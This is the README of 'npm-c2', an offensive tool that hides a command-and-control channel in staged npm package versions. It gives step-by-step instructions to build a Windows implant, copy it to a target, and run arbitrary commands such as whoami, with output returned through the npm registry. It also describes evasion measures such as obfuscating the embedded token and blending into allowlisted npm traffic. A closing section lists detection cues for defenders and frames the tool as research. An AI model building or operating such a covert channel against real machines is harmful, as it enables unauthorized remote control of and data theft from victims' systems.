# npm-c2

[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![Go 1.21+](https://img.shields.io/badge/go-1.21%2B-blue.svg)](https://go.dev)

A command channel built out of an npm package nobody installs. No server, no
domain, no certificate, no infrastructure. The operator writes commands into
staged versions on `registry.npmjs.org` and a Go binary on the target reads them
over the same HTTPS connection every developer laptop already makes.

```
operator -- POST /-/stage/package/<pkg> --> npm registry <-- GET /-/stage -- implant
             version string = command                        version string = output
```

## Quick start

**1. Install two things**

```sh
python3 --version    # 3.8 or newer
go version           # 1.21 or newer (only to build the implant)
```

On Linux, `gcc-mingw-w64` is optional: without it the build uses the compiled
resources already in `implant/resource/`. On Windows, Python 3.8+ and Go are
enough.

**2. Change four values**

```sh
git clone https://github.com/ikarus981/npm-c2.git && cd npm-c2
cp config.example.json config.json
```

| Field | What to put | Example |
|---|---|---|
| `package` | a package you control on npmjs.com | `my-telemetry-relay` |
| `token` | granular token with read + staging write | `npm_xxxx` |
| `channel` | 4 chars, first one `a` to `f` | `c0ff` |
| `passphrase` | a secret shared with the implant | `change-this-passphrase` |

`config.json` is ignored by git, so the token never leaves your machine. The
other two keys, `interval` and `jitter`, control the poll cadence and can stay
as they are.

**3. Build and run**

```sh
python3 build.py          # -> dist/node.exe
./c2.sh "whoami"          # one command, then its output
./c2.sh                   # interactive console
```

`./c2.sh` creates `.venv` on first use and installs the package into it. On
Windows use `.\c2.cmd "whoami"` or `.\c2.ps1 "whoami"` instead; both read the
same `config.json`.

A session looks like this:

```
[*] channel c0ff on my-telemetry-relay
c2> whoami
[*] staged 0.0.0-c0ff.h000001.c.AAD7XL5MTJFU...
[*] waiting up to 120s for output
DESKTOP-7F3A\user
c2> :quit
```

Copy `dist/node.exe` to the target and run it with no arguments. It polls,
executes and writes the output back. Nothing else is needed.

## How it works

npm retired classic tokens and stopped letting granular tokens with
`bypass_2fa` write dist-tags (`PUT /-/package/<pkg>/dist-tags/<tag>` returns
403). The write path still open to automation is staging a publish:
`POST /-/stage/package/<pkg>` returns 201. Reading the staged list
(`GET /-/stage`) requires the token, which is why the implant carries one.

A staged publish gives the reader back only the **version string**, so the
version carries the data:

```
0.0.0-<channel>.<h><seq>.<kind>.<payload>

channel   4 chars, first one a-f    never looks numeric
seq       "h" plus 6 hex digits     leading zeros legal, fixed width
kind      c = command, r = reply
payload   base32 A-Z2-7             no 0 or 1, so it never breaks semver
```

Capacity is about 227 base32 characters, roughly 141 bytes per version. Every
payload is compressed and sealed with AES-256-GCM: the key comes from the shared
passphrase through HKDF-SHA256, with a fresh nonce per message and the package
name as additional authenticated data. The token and the passphrase are
obfuscated in the binary, so `strings` reveals neither.

Each side remembers the sequence numbers it has already handled rather than a
single cursor, because operator and implant number their messages
independently. Staged versions never reach the public packument, so
`npm view <pkg> versions` still shows only the placeholder version.

## Repository layout

```
npm-c2/
├── README.md              this file (the only .md)
├── LICENSE                Apache-2.0
├── config.example.json    copy to config.json, change 4 values
├── pyproject.toml         Python package and npm-c2 entry point
├── build.py               config.json -> dist/node.exe
├── c2.sh                  Linux and macOS console
├── c2.ps1, c2.cmd         Windows console
├── src/npm_c2/            CLI, operator, staging transport, crypto
└── implant/               Go module: agent, wire format, resources
    ├── go.mod
    ├── *.go
    └── resource/          manifest, version info, compiled .syso
```

`src/npm_c2/` is a standard Python src-layout package. `implant/` is a Go
module with its own `go.mod`. `build.py` cross-compiles it to Windows with
`GOOS=windows`, so no toolchain is needed on the target.

## Configuration reference

Environment variables override `config.json` when both are present.

| Variable | Meaning | Default |
|---|---|---|
| `C2_PKG` | package that carries the channel | from `config.json` |
| `C2_TOKEN` | npm token, falls back to `.c2token` | from `config.json` |
| `C2_CHAN` | channel id | `c0ff` |
| `C2_PASS` | passphrase, empty means plaintext | from `config.json` |
| `NPMC2_API_BASE` | registry base URL | `https://registry.npmjs.org` |

`build.py` also accepts flags for one-off builds, for example
`python3 build.py --arch both --upx --interval 30 --jitter 5`. Run
`python3 build.py --help` for the full list.

## Cleanup

There is no delete API for staged versions. Every message leaves one behind and
the only way to remove them is npmjs.com, Staged Packages, Reject, one at a
time. Use a fresh `channel` for each engagement so you do not drag old history
along.

## What a SOC sees

Every request is HTTPS to an allowlisted host, which is why the channel works.
What gives it away is the shape: one package polled on a flat cadence for hours,
HTTP/2 under an npm user agent when real npm clients speak HTTP/1.1, a request
with no `Accept` header, a JA3 from Go's TLS stack wearing Node's name, and
staged versions whose prerelease is a base32 blob instead of a build
identifier. Without TLS termination only SNI, IP, port, byte counts and timing
remain. The full analysis and Sigma rules are in
[the write-up](https://ikarus981.github.io/posts/npm-registry-c2-channel/).

## Limits

- About 141 bytes per staged version, roughly 4.5 KB per reply.
- One command per poll cycle; the operator polls every few seconds while waiting.
- Slow and small by design. A research tool, not a replacement for a C2 framework.

## Legal

Published for research and for blue teams building detections. Run it against
your own accounts and your own lab. Using it against infrastructure you do not
own or have written permission to test is illegal in most jurisdictions and is
not what this repository is for.

## License

Apache License 2.0. See [LICENSE](LICENSE).
